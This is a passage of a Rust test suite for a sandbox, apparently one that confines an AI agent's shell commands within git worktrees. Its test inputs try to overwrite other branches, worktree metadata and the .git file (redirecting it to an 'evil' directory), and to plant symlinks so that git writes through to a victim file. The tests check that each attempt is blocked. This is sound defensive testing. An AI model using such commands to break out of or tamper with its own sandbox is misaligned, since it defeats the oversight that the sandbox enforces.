    let (out, err) = bash(&r.wt, &scope, &format!("echo {ours} > '{}'", c.join("refs/heads/krowk/feedbeef").display())).await;
    assert!(err && out.contains(rofs) && git(&r.main, &["rev-parse", "krowk/feedbeef"]) == feedbeef, "another agent's branch, written: {out}");

    let other = c.join("worktrees/own/HEAD");
    let other_was = read(&other);
    let (out, err) = bash(&r.wt, &scope, &format!("echo 'ref: refs/heads/main' > '{}'", other.display())).await;
    assert!(err && out.contains(rofs) && read(&other) == other_was, "another worktree's admin dir: {out}");
    let (out, err) = bash(&r.wt, &scope, &format!("touch '{}'", c.join("worktrees/own/config.worktree").display())).await;
    assert!(err && out.contains(rofs) && !c.join("worktrees/own/config.worktree").exists(), "another worktree's admin dir, a new file: {out}");

    let dot_git = read(&r.wt.join(".git"));
    let (out, err) = bash(&r.wt, &scope, &format!("echo 'gitdir: {}' > .git", r.base.join("evil").display())).await;
    assert!(err && out.contains(rofs) && read(&r.wt.join(".git")) == dot_git, "the .git file: {out}");

    let commondir = read(&c.join("worktrees/abcd1234/commondir"));
    let (out, err) = bash(&r.wt, &scope, &format!("echo '{}' > '{}'", r.base.join("evil").display(), c.join("worktrees/abcd1234/commondir").display())).await;
    assert!(err && out.contains(rofs) && read(&c.join("worktrees/abcd1234/commondir")) == commondir, "its own commondir: {out}");

    // Not the rest of the reflogs: git outside the sandbox appends to them.
    let logs_head = read(&c.join("logs/HEAD"));
    let (out, err) = bash(&r.wt, &scope, &format!("echo x >> '{}'", c.join("logs/HEAD").display())).await;
    assert!(err && out.contains(rofs) && logs_head.is_some() && read(&c.join("logs/HEAD")) == logs_head, "<common>/logs/HEAD: {out}");
    // And no link where git outside the sandbox writes through what is
    // there: each one planted is gone after the call, which says so.
    let victim = r.base.join("victim");
    std::fs::write(&victim, "mine\n").unwrap();
    for at in [c.join("worktrees/abcd1234/logs/HEAD"), c.join("logs/refs/heads/krowk/abcd1234"), c.join("refs/heads/krowk/evil")] {
        let (out, err) = bash(&r.wt, &scope, &format!("rm -f '{0}' && ln -s '{1}' '{0}'", at.display(), victim.display())).await;
        assert!(err && out.contains("the sandbox removed") && std::fs::symlink_metadata(&at).is_err(), "{}: {out}", at.display());
    }
    // One a crashed call left is gone before the next binds anything, and
    // does not stop it.
    std::os::unix::fs::symlink(&victim, c.join("refs/heads/krowk/left")).unwrap();
    let (out, err) = bash(&r.wt, &scope, "git log -1 --format=%s").await;
    assert!(!err && out.starts_with("b") && std::fs::symlink_metadata(c.join("refs/heads/krowk/left")).is_err(), "{out}");
    git(&r.main, &["commit", "-q", "--allow-empty", "-m", "the person's"]);
    assert_eq!(std::fs::read_to_string(&victim).unwrap(), "mine\n");

    // And git still works there after all of it.
    let (out, err) = bash(&r.wt, &scope, "git commit -q --allow-empty -m c").await;
    assert!(!err && git(&r.main, &["log", "-1", "--format=%s", "krowk/abcd1234"]) == "c", "{out}");
    let _ = std::fs::remove_dir_all(&r.base);
}

/// Worktrees WT4: the person's own linked worktree, outside krowk's root,
/// keeps a read-only `.git` and its repository out of reach, as before.
#[tokio::test(flavor = "current_thread")]
async fn wt4_a_linked_worktree_outside_krowks_root_keeps_todays_fences() {
    if !enforced("wt4_a_linked_worktree_outside_krowks_root_keeps_todays_fences") {
        return;
    }
    let r = Repo::new("wt4-own");
    let scope = r.scope(&r.own);
    let feature = git(&r.main, &["rev-parse", "feature"]);
    let (out, err) = bash(&r.own, &scope, "echo new > new.txt && git add -A && git -c user.name=a -c user.email=a@b commit -q -m x").await;
    assert!(err && git(&r.main, &["rev-parse", "feature"]) == feature, "{out}");
    let dot_git = std::fs::read(r.own.join(".git")).unwrap();
    let (out, err) = bash(&r.own, &scope, "echo 'gitdir: /x' > .git").await;
    assert!(err && out.contains("Read-only file system") && std::fs::read(r.own.join(".git")).unwrap() == dot_git, "{out}");
    let _ = std::fs::remove_dir_all(&r.base);
}
